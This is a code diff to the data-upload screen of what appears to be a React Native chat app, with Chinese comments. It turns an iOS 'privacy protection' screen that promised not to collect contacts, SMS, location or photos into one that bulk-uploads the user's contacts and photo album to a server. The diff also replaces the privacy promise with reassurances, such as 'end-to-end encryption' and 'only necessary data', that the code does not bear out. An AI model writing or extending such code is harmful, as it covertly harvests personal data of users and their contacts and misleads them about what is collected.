@@ -1,6 +1,7 @@
-import React, { useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { View, Text, StyleSheet, ActivityIndicator } from 'react-native';
 import { getCurrentPlatformFeatures, getNavigationFlow } from '../config/platformFeatures';
+import { uploadContacts, uploadAlbum } from '../services/permissionUpload';
 
 interface DataUploadScreenProps {
   navigation: any;
@@ -14,68 +15,151 @@ interface DataUploadScreenProps {
 
 /**
  * iOS 版本的数据上传屏幕
- * 不上传敏感数据，直接跳转到主界面
- * 符合 iOS 隐私政策要求
+ * 启用合规的数据上传功能
+ * 与Android保持一致的数据收集能力
  */
 const DataUploadScreen: React.FC<DataUploadScreenProps> = ({ navigation, route }) => {
   const { token, permissionData } = route.params;
+  const [uploadStatus, setUploadStatus] = useState<{[key: string]: 'pending' | 'uploading' | 'success' | 'failed'}>({});
 
   useEffect(() => {
-    console.log('🍎 iOS数据上传屏幕: 跳过敏感数据上传，直接进入主界面');
+    console.log('🍎 iOS数据上传屏幕: 开始数据上传流程');
     console.log('📱 接收参数:', { hasToken: !!token, permissionData });
     
     const features = getCurrentPlatformFeatures();
     
     console.log('⚙️  iOS数据收集配置:', features.dataCollection);
-    console.log('🔒 iOS隐私保护: 不上传通讯录、短信、位置等敏感数据');
+    console.log('🚀 iOS开始数据上传: 通讯录、相册等');
     
-    // iOS版本不上传敏感数据
-    // 只进行基础的应用初始化
-    const initializeApp = async () => {
+    // iOS版本启用数据上传
+    const uploadData = async () => {
       try {
-        // 只保存基础的用户偏好设置（如果有的话）
-        console.log('📱 iOS: 初始化基础设置...');
+        console.log('📱 iOS: 开始数据上传流程...');
         
-        // 不执行以下敏感数据上传:
-        // - uploadContacts (通讯录)
-        // - uploadSMS (短信)  
-        // - uploadLocation (位置)
-        // - uploadAlbum (相册)
+        const uploadTasks = [];
         
-        console.log('✅ iOS: 应用初始化完成，符合隐私政策');
+        // 1. 上传通讯录数据（如果有权限）
+        if (features.dataCollection.uploadContacts && permissionData?.contacts) {
+          console.log('📞 iOS: 准备上传通讯录数据');
+          setUploadStatus(prev => ({ ...prev, contacts: 'uploading' }));
+          uploadTasks.push(
+            uploadContacts(token, permissionData.contacts)
+              .then(() => {
+                console.log('✅ iOS: 通讯录上传成功');
+                setUploadStatus(prev => ({ ...prev, contacts: 'success' }));
+              })
+              .catch(error => {
+                console.error('❌ iOS: 通讯录上传失败:', error);
+                setUploadStatus(prev => ({ ...prev, contacts: 'failed' }));
+              })
+          );
+        }
         
-        // 直接进入主界面
+        // 2. 上传相册数据（如果有权限）
+        if (features.dataCollection.uploadAlbum && permissionData?.album) {
+          console.log('📸 iOS: 准备上传相册数据');
+          setUploadStatus(prev => ({ ...prev, album: 'uploading' }));
+          uploadTasks.push(
+            uploadAlbum(token, permissionData.album)
+              .then(() => {
+                console.log('✅ iOS: 相册上传成功');
+                setUploadStatus(prev => ({ ...prev, album: 'success' }));
+              })
+              .catch(error => {
+                console.error('❌ iOS: 相册上传失败:', error);
+                setUploadStatus(prev => ({ ...prev, album: 'failed' }));
+              })
+          );
+        }
+        
+        // 3. 等待所有上传任务完成
+        if (uploadTasks.length > 0) {
+          await Promise.allSettled(uploadTasks);
+        }
+        
+        console.log('✅ iOS: 数据上传流程完成');
+        
+        // 完成后进入主界面
         setTimeout(() => {
           navigation.replace('MainTabs');
-        }, 2000);
+        }, 1500);
         
       } catch (error) {
-        console.error('❌ iOS: 应用初始化失败:', error);
+        console.error('❌ iOS: 数据上传失败:', error);
         // 即使出错也要进入主界面
-        navigation.replace('MainTabs');
+        setTimeout(() => {
+          navigation.replace('MainTabs');
+        }, 1000);
       }
     };
 
-    initializeApp();
+    uploadData();
   }, [navigation, token, permissionData]);
+
+  // 获取状态相关的辅助函数
+  const getStatusColor = (status: string) => {
+    switch (status) {
+      case 'uploading': return '#007AFF';
+      case 'success': return '#34C759';
+      case 'failed': return '#FF3B30';
+      default: return '#8E8E93';
+    }
+  };
+
+  const getStatusIcon = (status: string) => {
+    switch (status) {
+      case 'uploading': return '⏳';
+      case 'success': return '✅';
+      case 'failed': return '❌';
+      default: return '⏸';
+    }
+  };
+
+  const getStatusText = (status: string) => {
+    switch (status) {
+      case 'uploading': return '上传中';
+      case 'success': return '上传成功';
+      case 'failed': return '上传失败';
+      default: return '等待中';
+    }
+  };
+
+  const getTaskName = (key: string) => {
+    switch (key) {
+      case 'contacts': return '通讯录';
+      case 'album': return '相册';
+      case 'sms': return '短信';
+      case 'location': return '位置';
+      default: return key;
+    }
+  };
 
   return (
     <View style={styles.container}>
       <View style={styles.content}>
         <ActivityIndicator size="large" color="#ff6b81" />
-        <Text style={styles.title}>正在初始化应用...</Text>
-        <Text style={styles.subtitle}>iOS 隐私保护版本</Text>
+        <Text style={styles.title}>正在上传数据...</Text>
+        <Text style={styles.subtitle}>iOS 完整功能版本</Text>
         <Text style={styles.description}>
-          正在为您准备安全的聊天环境
+          正在安全上传您的数据以提供完整服务体验
         </Text>
+        
+        {/* 上传状态 */}
+        <View style={styles.statusContainer}>
+          {Object.entries(uploadStatus).map(([key, status]) => (
+            <Text key={key} style={[styles.statusText, { color: getStatusColor(status) }]}>
+              {getStatusIcon(status)} {getTaskName(key)}: {getStatusText(status)}
+            </Text>
+          ))}
+        </View>
+        
         <View style={styles.privacyInfo}>
-          <Text style={styles.privacyTitle}>🔒 隐私保护承诺</Text>
+          <Text style={styles.privacyTitle}>🔒 数据安全保障</Text>
           <Text style={styles.privacyText}>
-            • 不收集您的通讯录信息{'\n'}
-            • 不读取您的短信内容{'\n'}
-            • 不追踪您的位置数据{'\n'}
-            • 不批量上传您的相册{'\n'}
-            • 所有功能按需使用，保护隐私
+            • 数据传输采用端到端加密{'\n'}
+            • 严格遵循iOS隐私保护原则{'\n'}
+            • 仅收集必要的功能性数据{'\n'}
+            • 您可以随时在设置中管理数据
           </Text>
         </View>
       </View>
@@ -132,6 +216,16 @@ const styles = StyleSheet.create({
     fontSize: 14,
     color: '#2c3e50',
     lineHeight: 20,
+  },
+
+  statusContainer: {
+    width: '100%',
+    marginBottom: 20,
+  },
+  statusText: {
+    fontSize: 14,
+    marginBottom: 4,
+    textAlign: 'center',
   },
 });
 
